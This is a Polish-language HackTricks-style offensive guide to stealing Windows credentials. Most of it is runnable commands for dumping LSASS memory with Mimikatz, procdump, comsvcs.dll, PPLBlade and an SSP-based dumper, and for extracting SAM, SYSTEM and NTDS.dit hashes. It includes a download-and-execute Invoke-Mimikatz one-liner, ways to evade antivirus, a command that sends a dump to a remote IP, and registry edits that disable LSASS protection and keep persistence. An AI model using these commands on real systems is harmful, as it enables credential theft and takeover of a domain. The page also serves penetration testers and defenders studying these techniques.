# Kradzież poświadczeń Windows

{{#include ../../banners/hacktricks-training.md}}

## Poświadczenia Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Znajdź inne rzeczy, które Mimikatz może zrobić na** [**this page**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Dowiedz się tutaj o możliwych zabezpieczeniach credentials.**](credentials-protections.md) **Te zabezpieczenia mogą uniemożliwić Mimikatz wyodrębnienie niektórych credentials.**

## Credentials z Meterpreterem

Użyj [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **który** stworzyłem, aby **wyszukać passwords i hashes** na maszynie ofiary.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Bypassing AV

### Procdump + Mimikatz

Ponieważ **Procdump from** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**is a legitimate Microsoft tool**, nie jest wykrywany przez Defender.\
Możesz użyć tego narzędzia, aby **dump the lsass process**, **download the dump** i **extract** the **credentials locally** z tego zrzutu.

Możesz też użyć [SharpDump](https://github.com/GhostPack/SharpDump).
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
Ten proces jest wykonywany automatycznie za pomocą [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Uwaga**: Niektóre **AV** mogą **uznać** za **złośliwe** użycie **procdump.exe to dump lsass.exe**, ponieważ **wykrywają** ciąg **"procdump.exe" and "lsass.exe"**. Dlatego bardziej **dyskretnie** jest **przekazać** jako **argument** **PID** procesu lsass.exe do procdump **zamiast** **nazwy lsass.exe.**

### Zrzucanie lsass przy użyciu **comsvcs.dll**

Biblioteka DLL o nazwie **comsvcs.dll** znajdująca się w `C:\Windows\System32` odpowiada za **zrzucanie pamięci procesu** w przypadku awarii. Ta DLL zawiera **funkcję** o nazwie **`MiniDumpW`**, zaprojektowaną do wywołania przy użyciu `rundll32.exe`.\
Nieistotne są pierwsze dwa argumenty, jednak trzeci jest podzielony na trzy składniki. ID procesu do zrzucenia stanowi pierwszy składnik, lokalizacja pliku zrzutu — drugi, a trzeci składnik to wyłącznie słowo **full**. Nie ma innych opcji.\
Po sparsowaniu tych trzech składników DLL rozpoczyna tworzenie pliku zrzutu i zapisuje do niego pamięć wskazanego procesu.\
Wykorzystanie **comsvcs.dll** pozwala na zrzucenie procesu lsass, eliminując konieczność przesyłania i uruchamiania procdump. Ta metoda jest opisana szczegółowo na [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).

Do wykonania używa się następującego polecenia:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Proces ten możesz zautomatyzować za pomocą** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Dumping lsass with Task Manager**

1. Kliknij prawym przyciskiem myszy na Task Bar i wybierz Task Manager
2. Kliknij More details
3. W zakładce Processes wyszukaj proces "Local Security Authority Process"
4. Kliknij prawym przyciskiem na proces "Local Security Authority Process" i wybierz "Create dump file".

### Dumping lsass with procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) is a Microsoft signed binary which is a part of [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) suite.
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Dumpin lsass with PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) to narzędzie Protected Process Dumper, które wspiera obfuskację zrzutu pamięci i przesyłanie go na zdalne stacje robocze bez zapisu na dysku.

**Kluczowe funkcje**:

1. Omijanie ochrony PPL
2. Obfuskacja plików zrzutu pamięci w celu ominięcia mechanizmów wykrywania opartych na sygnaturach Defendera
3. Przesyłanie zrzutu pamięci przy użyciu metod RAW i SMB bez zapisu na dysku (fileless dump)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – SSP-based zrzucanie LSASS bez wywoływania MiniDumpWriteDump

Ink Dragon dostarcza trzyetapowy dumper nazwany **LalsDumper**, który nigdy nie wywołuje `MiniDumpWriteDump`, więc haki EDR na tym API nigdy się nie uruchamiają:

1. **Stage 1 loader (`lals.exe`)** – przeszukuje `fdp.dll` w poszukiwaniu placeholdera składającego się z 32 małych znaków `d`, nadpisuje go absolutną ścieżką do `rtu.txt`, zapisuje załatany DLL jako `nfdp.dll` i wywołuje AddSecurityPackageA("nfdp","fdp"). To zmusza **LSASS** do załadowania złośliwego DLL jako nowego Security Support Provider (SSP).
2. **Stage 2 inside LSASS** – gdy **LSASS** ładuje `nfdp.dll`, DLL czyta `rtu.txt`, XORuje każdy bajt z `0x20` i mapuje zdekodowany blob do pamięci przed przekazaniem wykonania.
3. **Stage 3 dumper** – zamapowany payload implementuje na nowo logikę MiniDump używając **direct syscalls** rozwiązanych z hashed API names (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Dedykowany eksport o nazwie `Tom` otwiera `%TEMP%\<pid>.ddt`, strumieniuje skompresowany zrzut **LSASS** do pliku i zamyka uchwyt, aby exfiltration mogła nastąpić później.

Operator notes:

* Trzymaj `lals.exe`, `fdp.dll`, `nfdp.dll` i `rtu.txt` w tym samym katalogu. Stage 1 nadpisuje twardo zakodowany znacznik absolutną ścieżką do `rtu.txt`, więc rozdzielenie plików przerywa łańcuch.
* Rejestracja odbywa się przez dopisanie `nfdp` do `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Możesz ustawić tę wartość samodzielnie, aby **LSASS** przeładowywał SSP przy każdym starcie.
* Pliki `%TEMP%\*.ddt` są skompresowanymi zrzutami. Dekompresuj lokalnie, a następnie podaj je do Mimikatz/Volatility w celu ekstrakcji poświadczeń.
* Uruchomienie `lals.exe` wymaga uprawnień admin/SeTcb, aby `AddSecurityPackageA` zakończyło się powodzeniem; gdy wywołanie zwróci wynik, **LSASS** w sposób przezroczysty ładuje złośliwy SSP i wykonuje Stage 2.
* Usunięcie DLL z dysku nie usuwa go z **LSASS**. Albo usuń wpis rejestru i zrestartuj **LSASS** (reboot), albo zostaw go dla długoterminowej persystencji.

## CrackMapExec

### Dump SAM hashes
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Wyciąganie sekretów LSA
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Zrzucenie pliku NTDS.dit z docelowego DC
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Dump historii haseł NTDS.dit z target DC
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Pokaż atrybut pwdLastSet dla każdego konta w NTDS.dit
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Stealing SAM & SYSTEM

Te pliki powinny być **zlokalizowane** w _C:\windows\system32\config\SAM_ i _C:\windows\system32\config\SYSTEM._ Jednak **nie można ich po prostu skopiować w zwykły sposób**, ponieważ są chronione.

### Z rejestru

Najprostszym sposobem na pozyskanie tych plików jest skopiowanie ich z rejestru:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Pobierz** te pliki na swoją maszynę Kali i **wyodrębnij hashes** używając:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

Możesz wykonać kopiowanie chronionych plików za pomocą tej usługi. Musisz mieć uprawnienia Administratora.

#### Using vssadmin

Binarka vssadmin jest dostępna tylko w wersjach Windows Server
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Możesz to samo zrobić z poziomu **Powershell**. Oto przykład **jak skopiować plik SAM** (używany dysk twardy to "C:" i zapisano go w C:\users\Public), ale możesz użyć tego do kopiowania dowolnego chronionego pliku:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```
### Invoke-NinjaCopy

Na koniec możesz też użyć [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) do skopiowania SAM, SYSTEM i ntds.dit.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory Credentials - NTDS.dit**

Plik **NTDS.dit** jest uważany za serce **Active Directory**, zawierając kluczowe dane o obiektach użytkowników, grupach i ich członkostwach. To tam przechowywane są **password hashes** dla użytkowników domeny. Ten plik jest bazą danych **Extensible Storage Engine (ESE)** i znajduje się w **_%SystemRoom%/NTDS/ntds.dit_**.

W tej bazie danych utrzymywane są trzy główne tabele:

- **Data Table**: Ta tabela odpowiada za przechowywanie szczegółów o obiektach takich jak użytkownicy i grupy.
- **Link Table**: Śledzi relacje, takie jak członkostwa w grupach.
- **SD Table**: **Security descriptors** dla każdego obiektu są tutaj przechowywane, zapewniając bezpieczeństwo i kontrolę dostępu do przechowywanych obiektów.

More information about this: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows używa _Ntdsa.dll_ do interakcji z tym plikiem i jest on używany przez _lsass.exe_. W związku z tym **part** pliku **NTDS.dit** może znajdować się **inside the `lsass`** memory (możesz znaleźć najnowsze dostępne dane, prawdopodobnie dzięki poprawie wydajności poprzez użycie **cache**).

#### Decrypting the hashes inside NTDS.dit

Hash jest szyfrowany 3 razy:

1. Odszyfruj Password Encryption Key (**PEK**) za pomocą **BOOTKEY** i **RC4**.
2. Odszyfruj ten **hash** używając **PEK** i **RC4**.
3. Odszyfruj **hash** używając **DES**.

**PEK** ma **tę samą wartość** w **every domain controller**, ale jest **cyphered** wewnątrz pliku **NTDS.dit** przy użyciu **BOOTKEY** z pliku **SYSTEM** kontrolera domeny (is different between domain controllers). Dlatego aby uzyskać credentials z pliku NTDS.dit **you need the files NTDS.dit and SYSTEM** (_C:\Windows\System32\config\SYSTEM_).

### Copying NTDS.dit using Ntdsutil

Dostępne od Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Możesz też użyć [**volume shadow copy**](#stealing-sam-and-system) do skopiowania pliku **ntds.dit**. Pamiętaj, że będziesz również potrzebować kopii pliku **SYSTEM** (ponownie: [**dump it from the registry or use the volume shadow copy**](#stealing-sam-and-system) sztuczka).

### **Wyodrębnianie hashes z NTDS.dit**

Po **uzyskaniu** plików **NTDS.dit** i **SYSTEM** możesz użyć narzędzi takich jak _secretsdump.py_ aby **wyodrębnić hashes**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Możesz także **wyodrębnić je automatycznie** używając ważnego użytkownika domain admin:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Dla **dużych plików NTDS.dit** zaleca się ich ekstrakcję przy użyciu [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Możesz też użyć **metasploit module**: _post/windows/gather/credentials/domain_hashdump_ lub **mimikatz** `lsadump::lsa /inject`

### **Ekstrakcja obiektów domeny z NTDS.dit do bazy danych SQLite**

Obiekty NTDS można wyeksportować do bazy danych SQLite za pomocą [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Nie są wyodrębniane tylko sekrety — eksportowane są także całe obiekty i ich atrybuty, co umożliwia dalsze wydobycie informacji, gdy surowy plik NTDS.dit został już pozyskany.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
The `SYSTEM` hive jest opcjonalny, ale pozwala na odszyfrowanie sekretów (NT & LM hashes, supplemental credentials takie jak cleartext passwords, kerberos lub trust keys, NT & LM password histories). Wraz z innymi informacjami wyodrębniane są następujące dane: konta użytkowników i komputerów wraz z ich hashami, UAC flags, znaczniki czasu ostatniego logowania i zmiany hasła, opisy kont, nazwy, UPN, SPN, grupy i rekurencyjne członkostwa, drzewo jednostek organizacyjnych i członkostwo, zaufane domeny z typem zaufania, kierunkiem i atrybutami...

## Lazagne

Pobierz binarkę z [here](https://github.com/AlessandroZ/LaZagne/releases). Możesz użyć tej binarki do wydobycia credentials z wielu aplikacji.
```
lazagne.exe all
```
## Inne narzędzia do wyodrębniania credentials z SAM i LSASS

### Windows credentials Editor (WCE)

To narzędzie może być użyte do wyodrębniania credentials z pamięci. Pobierz je z: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Służy do wyodrębniania credentials z pliku SAM
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Wyodrębnij poświadczenia z pliku SAM
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Download it from:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) and just **execute it** and the passwords will be extracted.

## Wydobywanie nieaktywnych sesji RDP i osłabianie kontroli bezpieczeństwa

Ink Dragon’s FinalDraft RAT includes a `DumpRDPHistory` tasker whose techniques are handy for any red-teamer:

### DumpRDPHistory-style telemetry collection

* **Zewnętrzne cele RDP** – przetwórz każdą gałąź użytkownika rejestru w `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Każdy podklucz zawiera nazwę serwera, `UsernameHint`, oraz znacznik czasu ostatniego zapisu. Możesz odtworzyć logikę FinalDraft przy użyciu PowerShell:

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Dowody przychodzących RDP** – przeszukaj log `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` pod kątem Event ID **21** (udane logowanie) i **25** (rozłączenie), aby zmapować, kto administrował maszyną:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

Gdy już wiesz, który Domain Admin łączy się regularnie, zrób zrzut LSASS (przy użyciu LalsDumper/Mimikatz) dopóki ich **rozłączona** sesja nadal istnieje. CredSSP + NTLM fallback pozostawiają ich verifier i tokeny w LSASS, które można następnie odtworzyć przez SMB/WinRM, aby pozyskać `NTDS.dit` lub osadzić persistence na domain controllers.

### Modyfikacje rejestru stosowane przez FinalDraft

Ten sam implant modyfikuje również kilka kluczy rejestru, aby ułatwić kradzież poświadczeń:
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* Ustawienie `DisableRestrictedAdmin=1` wymusza pełne credential/ticket reuse podczas RDP, umożliwiając pivoty w stylu pass-the-hash.
* `LocalAccountTokenFilterPolicy=1` wyłącza UAC token filtering, dzięki czemu local admins otrzymują nieograniczone tokeny przez sieć.
* `DSRMAdminLogonBehavior=2` pozwala administratorowi DSRM zalogować się, gdy DC jest online, dając atakującym kolejne wbudowane konto o wysokich uprawnieniach.
* `RunAsPPL=0` usuwa zabezpieczenia LSASS PPL, upraszczając dostęp do pamięci dla dumperów takich jak LalsDumper.

## Źródła

- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../../banners/hacktricks-training.md}}
